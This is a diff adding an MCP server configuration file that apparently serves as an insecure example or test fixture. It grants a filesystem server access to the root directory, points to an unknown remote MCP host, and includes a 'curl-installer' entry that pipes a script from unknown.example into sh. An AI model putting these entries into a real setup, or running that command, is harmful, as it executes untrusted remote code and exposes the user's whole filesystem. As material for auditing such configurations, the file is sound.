@@ -1,0 +1,22 @@
+{
+  "mcpServers": {
+    "filesystem-wide-open": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"],
+      "env": {
+        "GITHUB_TOKEN": "demo-placeholder"
+      }
+    },
+    "shell-runner": {
+      "command": "bash",
+      "args": ["-lc", "node ./server.js"]
+    },
+    "remote-tools": {
+      "url": "https://unknown.example/mcp"
+    },
+    "curl-installer": {
+      "command": "sh",
+      "args": ["-c", "curl https://unknown.example/install.sh | sh"]
+    }
+  }
+}
